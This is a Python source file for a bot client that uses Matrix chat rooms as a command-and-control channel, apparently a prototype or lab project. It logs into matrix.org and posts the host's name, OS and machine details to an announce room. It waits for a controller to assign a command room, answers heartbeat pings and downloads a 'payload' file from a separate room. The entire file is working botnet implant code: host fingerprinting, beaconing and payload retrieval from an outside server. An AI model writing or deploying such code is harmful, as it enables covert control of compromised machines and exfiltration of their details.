import json
import platform
import socket
import threading
import time
import uuid
from matrix_client.client import MatrixClient, Room
from matrix_client.api import MatrixRequestError
import requests
from requests.exceptions import MissingSchema
import os
import sys
from dotenv import load_dotenv
import atexit



load_dotenv()
USER_NAME = os.getenv('BOT_NAME')  
PASSWORD = os.getenv('BOT_PASSWORD')
ANNOUNCE_ROOM_ID = os.getenv('ANNOUNCE_ROOM_ID')
PAYLOAD_ROOM_ID = os.getenv('PAYLOAD_ROOM_ID')
MATRIX_HOMESERVER = "https://matrix.org"
MATRIX_DOWNLOAD_PREFIX = "https://matrix-client.matrix.org/_matrix/client/v1/media/download/"

class Bot:
    access_token: str
    announce_room: Room = None
    command_room: Room = None
    
    announce_listener: uuid.UUID
    command_listener: uuid.UUID
    
    last_ping: float = 0
    ping_timeout_treshold: float = 10
    
    def __init__(self):
        self.got_room = False
        self.bot_id = str(uuid.uuid4())
        self.client = MatrixClient(MATRIX_HOMESERVER)

    def login(self):
        # login and sync
        try:
            self.access_token = self.client.login(username=USER_NAME, password=PASSWORD)
            print("[+] Logged in as bot.")
        except MatrixRequestError as e:
            print(e)
            if e.code == 403:
                print("Bad username or password.")
                sys.exit(4)
            else:
                print("Check your sever details are correct.")
                sys.exit(2)
        except MissingSchema as e:
            print("Bad URL format.")
            print(e)
            sys.exit(3)
            
    def join_room(self, roomid) -> Room:
        # check if already joined, if not join the room
        try:
            room: Room = self.client.rooms[roomid]
            print(f"Already joined room: {room.name}")
        except KeyError:
            room: Room = self.client.join_room(roomid)
            print(f"Joined room: {room.name}")
        return room
        
    def announce(self):
        status = self.announce_room.send_text(
            f"CONNECT:{self.get_system_info()}"
        )
        
    def disconnect(self):
        self.announce_room.send_text(
            f"DISCONNECT:{self.command_room.room_id}:{self.bot_id}"
        )
    
    def download_file(self, event, download_dir="downloads") -> str:
        content = event["content"]
        filename = content.get("body", "payload_file")
        filepath = os.path.join(download_dir, filename)
        os.makedirs(download_dir, exist_ok=True)
        
        # extract server and media ID from mxc URL
        mxc_url = content['url']
        durl = MATRIX_DOWNLOAD_PREFIX + mxc_url[6:]
        
        # download 
        response = requests.get(durl, headers={"Authorization": f"Bearer {self.client.token}"})
        response.raise_for_status()
        
        # save 
        with open(filepath, 'wb') as f:
            f.write(response.content)
        
        print(f"Downloaded file: {filepath}")
        return filepath
        
    def download_payload(self):
        payload_event = self.client.api.get_room_messages(
            PAYLOAD_ROOM_ID,
            "",
            "b",
            limit=5
        )
        for event in payload_event["chunk"]:
            if event.get("msgtype", "") == "m.image":
                self.download_file(event)
                break
        
    def get_system_info(self) -> str:
        return json.dumps({
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "platform_version": platform.version(),
            "machine": platform.machine(),
            "bot_id": self.bot_id,
            "python_version": platform.python_version()
        })
        
    def on_announcement(self, room, event):
        # not good that bot can see other bot's messages
        msgbody: str = event["content"]["body"]
        if not msgbody.startswith("RESOLVE"):
            return
        
        botid, roomid = msgbody.removeprefix("RESOLVE ").split(":", 1)
        if botid == self.bot_id:
            self.got_room = True
            self.command_room = self.join_room(roomid)
            self.announce_room.remove_listener(self.announce_listener)
            self.command_listener = self.command_room.add_listener(self.on_command, event_type="m.room.message")
            self.last_ping = time.time()
                
    def on_command(self, room, event):
        msgbody: str = event["content"]["body"]
        _, command = msgbody.split(":", 1)
        if command == "PING":
            self.announce_room.send_text(
                f"PONG:{self.command_room.room_id}:{self.bot_id}"
            )
            self.last_ping = time.time()
        else:
            print(msgbody)
            
    def make_announcement_listener(self) -> uuid.UUID:
        return self.announce_room.add_listener(self.on_announcement, event_type="m.room.message")
            
    def check_pings(self):
        while True:
            time.sleep(self.ping_timeout_treshold)
            # didn't receive two pings -> controller went offline -> start searching again
            if time.time() - self.last_ping > self.ping_timeout_treshold * 2:
                print("controller offline, starting search again")
                self.got_room = False
                self.command_room.remove_listener(self.command_listener)
                self.announce_listener = self.make_announcement_listener()
            
    def run(self):
        self.login()
        self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)
        # make sure joining and syncing is done before proceding
        time.sleep(2)
                
        self.announce_listener = self.make_announcement_listener()
        self.client.start_listener_thread()
        
        self.download_payload()
        
        def exit_handler():
            self.disconnect()
        atexit.register(exit_handler)
        
        threading.Thread(name="PING THREAD", target=self.check_pings, daemon=True).start()
        
        while True:
            if not self.got_room:
                self.announce()
                time.sleep(5) # TODO: In real world a minute or so

        
        

if __name__ == "__main__":
    bot = Bot()
    bot.run()